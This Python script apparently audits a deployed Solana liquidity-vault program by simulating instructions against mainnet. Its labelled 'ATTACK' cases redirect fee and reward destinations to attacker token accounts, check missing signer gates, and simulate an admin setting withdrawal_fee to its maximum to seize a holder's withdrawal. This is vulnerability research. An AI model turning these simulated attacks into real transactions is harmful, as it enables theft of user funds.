#!/usr/bin/env python3
"""Gates v2: collect_fees/rewards destination checks, MM signer, admin seizure vector."""
import base64, hashlib, json, sys
sys.path.insert(0, "/home/heisenberg/CA/armada/analysis")
from solrpc import *
from simtx import simulate, summarize

PROG = "ArmN3Av2boBg8pkkeCK9UuCN9zSUVc2UQg1qR2sKwm8d"
ORCA = "whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc"
TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
A = "/home/heisenberg/CA/armada/analysis"
samples = json.load(open(f"{A}/ix-full-samples.json"))
r1 = json.load(open(f"{A}/recon1.json"))
r6 = json.load(open(f"{A}/recon6_lpholders.json"))
d = lambda n: hashlib.sha256(f"global:{n}".encode()).digest()[:8]
ATT = "2xFbZtJjR3szsVXrjVwU35uA9uk35xujNufdUzPFsqFL"

def sim(label, payer, accounts, data, ret=None):
    ix = {"program_id": PROG, "accounts": accounts, "data": data}
    res = simulate([ix], payer, return_accounts=ret)
    summ = summarize(res)
    print(f"\n===== {label} ===== err={summ['err']} CU={summ.get('unitsConsumed')}")
    for l in summ["logs_tail"][-10:]:
        print("   ", l)
    return res, summ

def token_amount(pk):
    a = get_account(pk, encoding="jsonParsed")
    try:
        info = a["data"]["parsed"]["info"]
        return int(info["tokenAmount"]["amount"]) if "tokenAmount" in info else int(info["supply"])
    except Exception:
        return None

# ---------- collect_fees with correct metas (clp mut, tokenProgram ro, clpProgram ro) ----------
cf = samples["collect_fees"][0]
acc = cf["accounts"]; vault = acc[1]; v = r1["vaults"][vault]
# IDL order: payer(signer), clpVault, clp(mut), clpProgram, positionBundleTokenAccount, tokenVaultA, clpTokenVaultA, tokenVaultB, clpTokenVaultB, feeAccountTokenA, feeAccountTokenB, mmFeeAccountTokenA, mmFeeAccountTokenB, tokenProgram + remaining
ro_idx = {3, 4, 13}  # clpProgram, posBundleTA, tokenProgram
metas = [(a, i == 0, i not in ro_idx) for i, a in enumerate(acc)]
sim("collect_fees replay (correct metas, real fee accounts)", acc[0], metas, b58decode(cf["data"]))

def ata_of(owner, mint):
    r = rpc("getTokenAccountsByOwner", [owner, {"mint": mint}, {"encoding": "jsonParsed"}])
    vals = (r or {}).get("value") or []
    return vals[0]["pubkey"] if vals else None
att_a = ata_of(ATT, v["token_mint_a"]); att_b = ata_of(ATT, v["token_mint_b"])
acc2 = list(acc); acc2[9] = att_a or acc2[9]; acc2[10] = att_b or acc2[10]
metas2 = [(a, i == 0, i not in ro_idx) for i, a in enumerate(acc2)]
sim("collect_fees ATTACK: feeAccountTokenA/B = attacker ATAs", acc[0], metas2, b58decode(cf["data"]))
acc3 = list(acc); acc3[11] = att_a or acc3[11]; acc3[12] = att_b or acc3[12]
metas3 = [(a, i == 0, i not in ro_idx) for i, a in enumerate(acc3)]
sim("collect_fees ATTACK: mmFeeAccountTokenA/B = attacker ATAs", acc[0], metas3, b58decode(cf["data"]))

# ---------- collect_rewards attack ----------
cr = samples["collect_rewards"][0]
accr = cr["accounts"]
print("\ncollect_rewards accounts:", [a[:10] for a in accr])
# IDL: payer(signer), clp(mut), clpProgram, clpVault, positionBundleTokenAccount, tokenVaultA, tokenVaultB, tokenARewardVault(mut), tokenBRewardVault(mut), tokenAFeeAccount(mut), tokenBFeeAccount(mut), tokenProgram
accr2 = list(accr); accr2[9] = att_a or accr2[9]; accr2[10] = att_b or accr2[10]
metasr = [(a, i == 0, not (i in (2, 4, 11))) for i, a in enumerate(accr2)]
sim("collect_rewards ATTACK: fee accounts = attacker ATAs", accr[0], metasr, b58decode(cr["data"]))

# ---------- external swap signer gate ----------
es = samples["external_swap_setup"][0]; acce = es["accounts"]
metase = [(a, False, i in (1, 2)) for i, a in enumerate(acce)]  # MM (idx0) NOT signing
metase[1] = (acce[1], False, True)
sim("external_swap_setup: MM account present but NOT a signer", ATT, metase, b58decode(es["data"]))
ec = samples["external_swap_cleanup"][0]; acce2 = ec["accounts"]
metase2 = [(a, False, i in (1, 2)) for i, a in enumerate(acce2)]
sim("external_swap_cleanup: MM not a signer", ATT, metase2, b58decode(ec["data"]))

# ---------- admin seizure vector: updateConfig withdrawal_fee=max then withdraw ----------
VK = "HTKMVZXE8HRHyBGkpXGwzRgncy5HxAoo9Ls21ouzqNoL"
v2 = r1["vaults"][VK]
cur = r6[VK]["top"][0]
w = samples["withdraw"][0]
base = list(w["accounts"]); wdata = b58decode(w["data"])
lp_amount = int.from_bytes(wdata[8:16], "little")
wdata0 = wdata[:8] + wdata[8:16] + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
ata_a = ata_of(cur["owner"], v2["token_mint_a"]); ata_b = ata_of(cur["owner"], v2["token_mint_b"])
fee_a = ata_of(v2["fee_owner"], v2["token_mint_a"]); fee_b = ata_of(v2["fee_owner"], v2["token_mint_b"])
print("\nHTKMVZ: holder", cur["owner"][:10], "ata_a", ata_a, "ata_b", ata_b, "fee_a", fee_a, "fee_b", fee_b)
ADMIN = v2["admin_key"]
args = b58decode(v2["market_making_key"]) + b58decode(v2["fee_owner"]) + (v2["performance_fee"]).to_bytes(4, "little") + (4294967295).to_bytes(4, "little") + (v2["market_making_fee"]).to_bytes(4, "little") + bytes([v2["strategy"]]) + b58decode(v2["stake_pool"]) + bytes([v2["features_enabled"]])
uc = {"program_id": PROG, "accounts": [(ADMIN, True, True), (VK, False, True)], "data": d("update_config") + args}
wd = {"program_id": PROG, "accounts": [
    (cur["owner"], True, False), (ata_a, False, True), (ata_b, False, True), (cur["ata"], False, True),
    (VK, False, False), (v2["lp_mint"], False, True), (v2["token_vault_a"], False, True), (v2["token_vault_b"], False, True),
    (v2["position_bundle_token_account"], False, False), (ORCA, False, False), (v2["clp"], False, True),
    (base[11], False, True), (base[12], False, True), (fee_a or base[13], False, True), (fee_b or base[14], False, True),
    (TOKEN, False, False)] + [(a, False, True) for a in base[16:]],
    "data": wdata0}
pre = {"lp": token_amount(cur["ata"]), "a": token_amount(ata_a), "b": token_amount(ata_b),
       "fa": token_amount(fee_a), "fb": token_amount(fee_b)}
ret = [ata_a, ata_b, cur["ata"], fee_a, fee_b]
res = simulate([uc, wd], cur["owner"], return_accounts=ret)
summ = summarize(res)
print(f"\n===== PRIVILEGED: admin sets withdrawal_fee=max, then holder withdraws {lp_amount} LP =====")
print("err:", summ["err"], "CU:", summ.get("unitsConsumed"))
post = {}
for addr, a in zip(ret, (res.get("value") or {}).get("accounts") or []):
    if not a: continue
    post[addr] = int.from_bytes(base64.b64decode(a["data"][0])[64:72], "little")
print("pre :", pre)
print("post:", post)
if pre["a"] is not None and post.get(ata_a) is not None:
    print("holder received A:", post[ata_a] - pre["a"], " B:", post.get(ata_b, pre["b"]) - pre["b"])
    print("fee_owner received A:", post.get(fee_a, 0) - (pre["fa"] or 0), " B:", post.get(fee_b, 0) - (pre["fb"] or 0))
